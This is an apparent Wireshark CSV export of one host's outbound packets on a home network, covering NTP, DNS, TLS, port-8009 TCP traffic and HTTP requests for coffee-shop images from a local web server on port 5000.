"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"51","2023-10-21 13:47:50.278860362","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"73","2023-10-21 13:47:52.205410344","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1 Ack=1 Win=501 Len=110 TSval=2919158974 TSecr=1841245560 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"76","2023-10-21 13:47:52.208549787","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=111 Ack=111 Win=501 Len=0 TSval=2919158978 TSecr=1841250576","VMware_65:77:ad"
"78","2023-10-21 13:47:52.208973689","192.168.1.227","192.168.1.1","TCP","66","[TCP Dup ACK 76#1] 42434  >  8009 [ACK] Seq=111 Ack=111 Win=501 Len=0 TSval=2919158978 TSecr=1841250576","VMware_65:77:ad"
"222","2023-10-21 13:47:57.212778198","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=111 Ack=111 Win=501 Len=110 TSval=2919163982 TSecr=1841250576 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"224","2023-10-21 13:47:57.218903730","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=221 Ack=221 Win=501 Len=0 TSval=2919163988 TSecr=1841255583","VMware_65:77:ad"
"318","2023-10-21 13:48:02.223156428","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=221 Ack=221 Win=501 Len=110 TSval=2919168990 TSecr=1841255583 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"320","2023-10-21 13:48:02.226410922","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=331 Ack=331 Win=501 Len=0 TSval=2919168995 TSecr=1841260593","VMware_65:77:ad"
"510","2023-10-21 13:48:07.229317688","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=331 Ack=331 Win=501 Len=110 TSval=2919173998 TSecr=1841260593 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"512","2023-10-21 13:48:07.231686519","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=441 Ack=441 Win=501 Len=0 TSval=2919174001 TSecr=1841265599","VMware_65:77:ad"
"717","2023-10-21 13:48:12.239023845","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=441 Ack=441 Win=501 Len=110 TSval=2919179008 TSecr=1841265599 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"719","2023-10-21 13:48:12.260518289","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=551 Ack=551 Win=501 Len=0 TSval=2919179028 TSecr=1841270608","VMware_65:77:ad"
"924","2023-10-21 13:48:17.273019689","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=551 Ack=551 Win=501 Len=110 TSval=2919184039 TSecr=1841270608 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"926","2023-10-21 13:48:17.283623104","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=661 Ack=661 Win=501 Len=0 TSval=2919184052 TSecr=1841275650","VMware_65:77:ad"
"1036","2023-10-21 13:48:22.284580754","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=661 Ack=661 Win=501 Len=110 TSval=2919189053 TSecr=1841275650 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1038","2023-10-21 13:48:22.286826625","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=771 Ack=771 Win=501 Len=0 TSval=2919189056 TSecr=1841280654","VMware_65:77:ad"
"1050","2023-10-21 13:48:22.475488807","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"1052","2023-10-21 13:48:22.565056815","192.168.1.227","192.168.1.183","TCP","74","52686  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341538638 TSecr=0 WS=128","VMware_65:77:ad"
"1056","2023-10-21 13:48:22.566663823","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341538641 TSecr=1741518850","VMware_65:77:ad"
"1057","2023-10-21 13:48:22.571054322","192.168.1.227","192.168.1.183","HTTP","499","GET / HTTP/1.1 ","VMware_65:77:ad"
"1062","2023-10-21 13:48:22.706840036","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=176 Win=64128 Len=0 TSval=2341538781 TSecr=1741518990","VMware_65:77:ad"
"1065","2023-10-21 13:48:22.707123048","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=5968 Win=61568 Len=0 TSval=2341538781 TSecr=1741518991","VMware_65:77:ad"
"1067","2023-10-21 13:48:22.707403512","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=7347 Win=60544 Len=0 TSval=2341538781 TSecr=1741518991","VMware_65:77:ad"
"1068","2023-10-21 13:48:22.715584944","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [FIN, ACK] Seq=434 Ack=7348 Win=64128 Len=0 TSval=2341538789 TSecr=1741518992","VMware_65:77:ad"
"1089","2023-10-21 13:48:23.452281989","192.168.1.227","192.168.1.254","DNS","80","Standard query 0xf0a9 A fonts.googleapis.com","VMware_65:77:ad"
"1090","2023-10-21 13:48:23.452282360","192.168.1.227","192.168.1.254","DNS","80","Standard query 0x8da8 AAAA fonts.googleapis.com","VMware_65:77:ad"
"1091","2023-10-21 13:48:23.452559019","192.168.1.227","192.168.1.254","DNS","77","Standard query 0xa378 A www.w3schools.com","VMware_65:77:ad"
"1092","2023-10-21 13:48:23.452610628","192.168.1.227","192.168.1.254","DNS","77","Standard query 0x0977 AAAA www.w3schools.com","VMware_65:77:ad"
"1096","2023-10-21 13:48:23.483322960","192.168.1.227","74.125.200.95","TCP","74","53016  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2027201309 TSecr=0 WS=128","VMware_65:77:ad"
"1098","2023-10-21 13:48:23.486984523","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2027201313 TSecr=3154215697","VMware_65:77:ad"
"1099","2023-10-21 13:48:23.499246090","192.168.1.227","192.168.1.183","TCP","74","52692  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539573 TSecr=0 WS=128","VMware_65:77:ad"
"1101","2023-10-21 13:48:23.499973570","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539574 TSecr=1741519784","VMware_65:77:ad"
"1102","2023-10-21 13:48:23.500843677","192.168.1.227","192.168.1.183","HTTP","463","GET /static/images/coffeeshop.jpg HTTP/1.1 ","VMware_65:77:ad"
"1104","2023-10-21 13:48:23.502148739","192.168.1.227","192.168.1.183","TCP","74","52708  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539576 TSecr=0 WS=128","VMware_65:77:ad"
"1106","2023-10-21 13:48:23.502580116","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539576 TSecr=1741519786","VMware_65:77:ad"
"1107","2023-10-21 13:48:23.503048092","192.168.1.227","192.168.1.183","HTTP","465","GET /static/images/coffeehouse2.jpg HTTP/1.1 ","VMware_65:77:ad"
"1109","2023-10-21 13:48:23.511424772","192.168.1.227","192.168.1.183","TCP","74","52714  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539585 TSecr=0 WS=128","VMware_65:77:ad"
"1111","2023-10-21 13:48:23.511951234","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539586 TSecr=1741519796","VMware_65:77:ad"
"1112","2023-10-21 13:48:23.515444975","192.168.1.227","192.168.1.183","HTTP","456","GET /static/images/map.jpg HTTP/1.1 ","VMware_65:77:ad"
"1118","2023-10-21 13:48:23.536815563","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=371 Win=64128 Len=0 TSval=2341539610 TSecr=1741519820","VMware_65:77:ad"
"1119","2023-10-21 13:48:23.536947997","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=369 Win=64128 Len=0 TSval=2341539611 TSecr=1741519820","VMware_65:77:ad"
"1120","2023-10-21 13:48:23.536948027","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=364 Win=64128 Len=0 TSval=2341539611 TSecr=1741519821","VMware_65:77:ad"
"1128","2023-10-21 13:48:23.537693707","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=7609 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1130","2023-10-21 13:48:23.537693817","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=7604 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1132","2023-10-21 13:48:23.537693837","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=13396 Win=56704 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1135","2023-10-21 13:48:23.538218007","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=16292 Win=54656 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1136","2023-10-21 13:48:23.538218108","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=7611 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1137","2023-10-21 13:48:23.538218128","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=13401 Win=61568 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1138","2023-10-21 13:48:23.538218148","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=8563 Win=64128 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1139","2023-10-21 13:48:23.538218178","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=14355 Win=60544 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1140","2023-10-21 13:48:23.538218198","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=16753 Win=62592 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1142","2023-10-21 13:48:23.538479096","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=23993 Win=71168 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1147","2023-10-21 13:48:23.538884875","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=27876 Win=46848 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1148","2023-10-21 13:48:23.538884955","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=42356 Win=37120 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1149","2023-10-21 13:48:23.538956943","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=24491 Win=58752 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1151","2023-10-21 13:48:23.539246331","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=31046 Win=53760 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1154","2023-10-21 13:48:23.539603802","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=48148 Win=61568 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1157","2023-10-21 13:48:23.539780440","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=24945 Win=74112 Len=0 TSval=2341539613 TSecr=1741519823","VMware_65:77:ad"
"1158","2023-10-21 13:48:23.540102690","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=32185 Win=71168 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1159","2023-10-21 13:48:23.540102790","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=69868 Win=51072 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1164","2023-10-21 13:48:23.540102820","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=40873 Win=65280 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1165","2023-10-21 13:48:23.540102841","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=48113 Win=60416 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1166","2023-10-21 13:48:23.540517443","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=80004 Win=84480 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1168","2023-10-21 13:48:23.540517543","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=109716 Win=143872 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1172","2023-10-21 13:48:23.541433830","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=49521 Win=75008 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1173","2023-10-21 13:48:23.541433900","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=111860 Win=148096 Len=0 TSval=2341539615 TSecr=1741519824","VMware_65:77:ad"
"1174","2023-10-21 13:48:23.541433930","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [FIN, ACK] Seq=400 Ack=31046 Win=64128 Len=0 TSval=2341539615 TSecr=1741519822","VMware_65:77:ad"
"1176","2023-10-21 13:48:23.541433950","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=142268 Win=208896 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1177","2023-10-21 13:48:23.541433970","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=143716 Win=211840 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1178","2023-10-21 13:48:23.541434001","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=169780 Win=263936 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1179","2023-10-21 13:48:23.542940793","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [FIN, ACK] Seq=398 Ack=50157 Win=75008 Len=0 TSval=2341539617 TSecr=1741519824","VMware_65:77:ad"
"1182","2023-10-21 13:48:23.555631148","192.168.1.227","192.229.179.87","TCP","74","36704  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3909217046 TSecr=0 WS=128","VMware_65:77:ad"
"1183","2023-10-21 13:48:23.555631559","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [FIN, ACK] Seq=391 Ack=170980 Win=266880 Len=0 TSval=2341539630 TSecr=1741519825","VMware_65:77:ad"
"1186","2023-10-21 13:48:23.558509865","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=3909217049 TSecr=1197392397","VMware_65:77:ad"
"1189","2023-10-21 13:48:23.822341097","192.168.1.227","74.125.200.95","TLSv1.3","1134","Client Hello","VMware_65:77:ad"
"1190","2023-10-21 13:48:23.823409193","192.168.1.227","192.229.179.87","TLSv1.3","1043","Client Hello","VMware_65:77:ad"
"1194","2023-10-21 13:48:23.825983861","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1069 Ack=197 Win=64128 Len=0 TSval=2027201652 TSecr=3154216037","VMware_65:77:ad"
"1196","2023-10-21 13:48:23.827107146","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=978 Ack=4004 Win=62592 Len=0 TSval=3909217318 TSecr=1197392666","VMware_65:77:ad"
"1197","2023-10-21 13:48:23.834033989","192.168.1.227","74.125.200.95","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1199","2023-10-21 13:48:23.839446634","192.168.1.227","74.125.200.95","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1200","2023-10-21 13:48:23.839522560","192.168.1.227","74.125.200.95","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1201","2023-10-21 13:48:23.839730703","192.168.1.227","74.125.200.95","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1202","2023-10-21 13:48:23.841857583","192.168.1.227","74.125.200.95","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1206","2023-10-21 13:48:23.846405492","192.168.1.227","74.125.200.95","TLSv1.3","431","Application Data","VMware_65:77:ad"
"1212","2023-10-21 13:48:23.853721970","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1755 Ack=2363 Win=62720 Len=0 TSval=2027201679 TSecr=3154216064","VMware_65:77:ad"
"1213","2023-10-21 13:48:23.859811713","192.168.1.227","74.125.200.95","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1215","2023-10-21 13:48:23.869498456","192.168.1.227","192.229.179.87","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1216","2023-10-21 13:48:23.870230037","192.168.1.227","192.229.179.87","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1217","2023-10-21 13:48:23.870414415","192.168.1.227","192.229.179.87","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1218","2023-10-21 13:48:23.870936450","192.168.1.227","192.229.179.87","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1219","2023-10-21 13:48:23.870989652","192.168.1.227","192.229.179.87","TLSv1.3","424","Application Data","VMware_65:77:ad"
"1226","2023-10-21 13:48:23.874460259","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4259 Win=64128 Len=0 TSval=3909217365 TSecr=1197392710","VMware_65:77:ad"
"1227","2023-10-21 13:48:23.874507189","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4514 Win=64000 Len=0 TSval=3909217365 TSecr=1197392711","VMware_65:77:ad"
"1228","2023-10-21 13:48:23.874507239","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4610 Win=64000 Len=0 TSval=3909217365 TSecr=1197392711","VMware_65:77:ad"
"1229","2023-10-21 13:48:23.874549820","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4641 Win=64000 Len=0 TSval=3909217366 TSecr=1197392711","VMware_65:77:ad"
"1232","2023-10-21 13:48:23.874904927","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=8985 Win=61568 Len=0 TSval=3909217366 TSecr=1197392713","VMware_65:77:ad"
"1233","2023-10-21 13:48:23.874904977","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=10284 Win=60416 Len=0 TSval=3909217366 TSecr=1197392713","VMware_65:77:ad"
"1234","2023-10-21 13:48:23.875430343","192.168.1.227","192.229.179.87","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1237","2023-10-21 13:48:24.082918465","192.168.1.227","192.168.1.183","TCP","74","52720  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341540156 TSecr=0 WS=128","VMware_65:77:ad"
"1239","2023-10-21 13:48:24.083670709","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341540158 TSecr=1741520367","VMware_65:77:ad"
"1240","2023-10-21 13:48:24.084080470","192.168.1.227","192.168.1.183","HTTP","464","GET /static/images/coffeehouse.jpg HTTP/1.1 ","VMware_65:77:ad"
"1244","2023-10-21 13:48:24.086469880","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=370 Win=64128 Len=0 TSval=2341540160 TSecr=1741520370","VMware_65:77:ad"
"1246","2023-10-21 13:48:24.086616931","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=7610 Win=60672 Len=0 TSval=2341540160 TSecr=1741520371","VMware_65:77:ad"
"1247","2023-10-21 13:48:24.086662609","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=8562 Win=59776 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1249","2023-10-21 13:48:24.087157954","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=16754 Win=53632 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1252","2023-10-21 13:48:24.087564767","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=24946 Win=59648 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1255","2023-10-21 13:48:24.087804115","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=32186 Win=60672 Len=0 TSval=2341540162 TSecr=1741520371","VMware_65:77:ad"
"1256","2023-10-21 13:48:24.087804185","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=33138 Win=59776 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1258","2023-10-21 13:48:24.087960936","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=40378 Win=60672 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1260","2023-10-21 13:48:24.088238387","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=41330 Win=64128 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1262","2023-10-21 13:48:24.088397672","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=48570 Win=60672 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1263","2023-10-21 13:48:24.088443380","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=49522 Win=59776 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1267","2023-10-21 13:48:24.088910364","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=57714 Win=80512 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1269","2023-10-21 13:48:24.088910454","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=64954 Win=94976 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1270","2023-10-21 13:48:24.089046945","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=67850 Win=100864 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1272","2023-10-21 13:48:24.089214005","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=68813 Win=103680 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1273","2023-10-21 13:48:24.091602707","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [FIN, ACK] Seq=399 Ack=68814 Win=103680 Len=0 TSval=2341540165 TSecr=1741520373","VMware_65:77:ad"
"1275","2023-10-21 13:48:24.216414015","192.168.1.227","192.168.1.254","DNS","77","Standard query 0xad68 A fonts.gstatic.com","VMware_65:77:ad"
"1276","2023-10-21 13:48:24.216414656","192.168.1.227","192.168.1.254","DNS","77","Standard query 0x746d AAAA fonts.gstatic.com","VMware_65:77:ad"
"1279","2023-10-21 13:48:24.231922237","192.168.1.227","142.251.10.94","TCP","74","49592  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=831660084 TSecr=0 WS=128","VMware_65:77:ad"
"1281","2023-10-21 13:48:24.235155359","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=831660088 TSecr=4285554289","VMware_65:77:ad"
"1282","2023-10-21 13:48:24.242076485","192.168.1.227","142.251.10.94","TLSv1.3","1131","Client Hello","VMware_65:77:ad"
"1285","2023-10-21 13:48:24.245635778","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1066 Ack=197 Win=64128 Len=0 TSval=831660099 TSecr=4285554300","VMware_65:77:ad"
"1286","2023-10-21 13:48:24.249713512","192.168.1.227","142.251.10.94","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1287","2023-10-21 13:48:24.250444009","192.168.1.227","142.251.10.94","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1288","2023-10-21 13:48:24.250579831","192.168.1.227","142.251.10.94","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1289","2023-10-21 13:48:24.250635638","192.168.1.227","142.251.10.94","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1290","2023-10-21 13:48:24.251636284","192.168.1.227","142.251.10.94","TLSv1.3","495","Application Data","VMware_65:77:ad"
"1294","2023-10-21 13:48:24.253203935","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1769 Ack=876 Win=64128 Len=0 TSval=831660106 TSecr=4285554307","VMware_65:77:ad"
"1295","2023-10-21 13:48:24.253766795","192.168.1.227","142.251.10.94","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1305","2023-10-21 13:48:24.256471696","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1816 Ack=18219 Win=52096 Len=0 TSval=831660109 TSecr=4285554310","VMware_65:77:ad"
"1308","2023-10-21 13:48:24.258425745","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1816 Ack=19494 Win=64128 Len=0 TSval=831660111 TSecr=4285554311","VMware_65:77:ad"
"1309","2023-10-21 13:48:24.259224578","192.168.1.227","142.251.10.94","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1317","2023-10-21 13:48:24.544675047","192.168.1.227","192.168.1.183","TCP","74","52730  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341540618 TSecr=0 WS=128","VMware_65:77:ad"
"1319","2023-10-21 13:48:24.545343697","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341540619 TSecr=1741520829","VMware_65:77:ad"
"1320","2023-10-21 13:48:24.545704649","192.168.1.227","192.168.1.183","HTTP","446","GET /favicon.ico HTTP/1.1 ","VMware_65:77:ad"
"1324","2023-10-21 13:48:24.555059996","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [ACK] Seq=381 Ack=182 Win=64128 Len=0 TSval=2341540629 TSecr=1741520839","VMware_65:77:ad"
"1325","2023-10-21 13:48:24.555579158","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [FIN, ACK] Seq=381 Ack=390 Win=64128 Len=0 TSval=2341540629 TSecr=1741520839","VMware_65:77:ad"
"1382","2023-10-21 13:48:27.293959780","192.168.1.227","192.168.1.1","AJP13","176","AJP13 Error? [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1384","2023-10-21 13:48:27.299447972","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=881 Ack=881 Win=501 Len=0 TSval=2919194068 TSecr=1841285666","VMware_65:77:ad"
"1388","2023-10-21 13:48:27.479367041","192.168.1.227","192.168.1.183","TCP","74","51956  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341543553 TSecr=0 WS=128","VMware_65:77:ad"
"1390","2023-10-21 13:48:27.479960618","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341543554 TSecr=1741523764","VMware_65:77:ad"
"1391","2023-10-21 13:48:27.480134722","192.168.1.227","192.168.1.183","HTTP","577","GET /api?filename=static/images/coffeeshop.jpg HTTP/1.1 ","VMware_65:77:ad"
"1397","2023-10-21 13:48:27.490500675","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=177 Win=64128 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1398","2023-10-21 13:48:27.490500795","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=7417 Win=60032 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1399","2023-10-21 13:48:27.490561211","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=13209 Win=56064 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1402","2023-10-21 13:48:27.491102638","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=27689 Win=46976 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
